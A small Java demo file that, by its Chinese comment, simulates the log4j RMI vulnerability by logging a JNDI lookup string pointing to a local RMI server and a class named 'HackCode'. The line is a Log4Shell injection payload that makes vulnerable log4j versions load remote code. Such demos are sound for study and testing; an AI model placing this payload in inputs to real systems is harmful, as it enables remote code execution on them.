package com.simpledev.tools.safe;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 模拟log4j rmi漏洞
 */
public class Main {
    static Logger logger = LogManager.getLogger();
    public static void main(String ... args) throws Exception {
        logger.error( "${java:os}");
        logger.error("${jndi:rmi://127.0.0.1:1099/HackCode}");
    }
}
